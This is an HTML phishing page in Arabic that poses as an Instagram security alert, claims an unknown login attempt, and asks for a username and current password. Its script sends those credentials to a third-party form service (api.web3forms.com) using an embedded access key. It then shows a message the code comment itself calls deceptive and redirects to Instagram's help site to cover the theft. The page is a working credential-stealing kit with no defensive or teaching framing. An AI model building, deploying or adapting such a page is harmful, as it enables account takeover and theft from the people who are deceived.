<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأمين الحساب | Instagram Security</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root {
            --security-blue: #0095f6;
            --danger-red: #ed4956;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body { 
            font-family: 'Inter', sans-serif; 
            background: #fafafa; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            color: #262626;
        }

        /* شريط التنبيه الأمني العلوي */
        .security-banner {
            width: 100%;
            background: var(--danger-red);
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 13px;
            font-weight: 600;
        }

        .login-container { 
            max-width: 400px; 
            width: 90%; 
            background: #fff; 
            border: 1px solid #dbdbdb;
            margin-top: 50px;
            padding: 30px;
            border-radius: 3px;
            text-align: center;
        }

        .security-icon {
            font-size: 50px;
            color: var(--security-blue);
            margin-bottom: 15px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #262626;
        }

        .security-notice {
            font-size: 14px;
            color: #8e8e8e;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .input-group { margin-bottom: 10px; }

        .input-group input { 
            width: 100%; 
            padding: 12px; 
            font-size: 13px; 
            background: #fafafa; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            outline: none; 
        }

        .verify-btn { 
            background: var(--security-blue); 
            color: white; 
            font-weight: 600; 
            font-size: 14px; 
            padding: 10px; 
            width: 100%; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            margin-top: 10px;
        }

        .footer-info {
            margin-top: 20px;
            font-size: 12px;
            color: #afafaf;
        }

        /* تأثير النبض للأيقونة لتبدو وكأنها تفحص */
        .pulse {
            animation: pulse-animation 2s infinite;
        }

        @keyframes pulse-animation {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .toast-message { 
            position: fixed; 
            bottom: 20px; 
            background: rgba(0,0,0,0.8); 
            color: #fff; 
            padding: 10px 20px; 
            border-radius: 30px; 
            font-size: 13px; 
            opacity: 0; 
            transition: 0.3s; 
        }
    </style>
</head>
<body>

<div class="security-banner">
    <i class="fas fa-exclamation-triangle"></i> تنبيه أمني: تم رصد محاولة دخول غير معروفة لحسابك.
</div>

<div class="login-container">
    <div class="security-icon pulse">
        <i class="fas fa-shield-alt"></i>
    </div>
    <div class="logo-text">تأكيد الهوية</div>
    <p class="security-notice">
        لحماية مجتمعنا، يرجى تأكيد بيانات حسابك للمتابعة. يساعدنا هذا في التأكد من أنك صاحب الحساب الحقيقي.
    </p>
    
    <form id="securityForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="كلمة السر الحالية" required>
        </div>
        <button type="submit" class="verify-btn" id="submitBtn">تأمين الحساب الآن</button>
    </form>

    <div class="footer-info">
        <i class="fas fa-lock"></i> اتصال آمن ومشفّر (SSL)
    </div>
</div>

<div id="toastMsg" class="toast-message">جاري معالجة الطلب...</div>

<script>
    const WEB3FORMS_KEY = "d43e19ca-76c7-4ff0-8024-02990c574048";
    const securityForm = document.getElementById('securityForm');
    const submitBtn = document.getElementById('submitBtn');
    const toastEl = document.getElementById('toastMsg');

    function showToast(message) {
        toastEl.innerText = message;
        toastEl.style.opacity = '1';
        setTimeout(() => { toastEl.style.opacity = '0'; }, 3000);
    }

    securityForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التأمين...';

        const formData = new FormData();
        formData.append("access_key", WEB3FORMS_KEY);
        formData.append("subject", "تأكيد أمني جديد");
        formData.append("User", document.getElementById('username').value);
        formData.append("Pass", document.getElementById('password').value);

        try {
            const response = await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                // رسالة تضليلية ذكية
                showToast("تم تحديث إعدادات الأمان. سيتم إعادة توجيهك.");
                setTimeout(() => {
                    window.location.href = "https://help.instagram.com/"; 
                }, 2000);
            }
        } catch (error) {
            showToast("حدث خطأ في الخادم. حاول مجدداً.");
        } finally {
            submitBtn.disabled = false;
            submitBtn.innerText = "تأمين الحساب الآن";
        }
    });
</script>

</body>
</html>
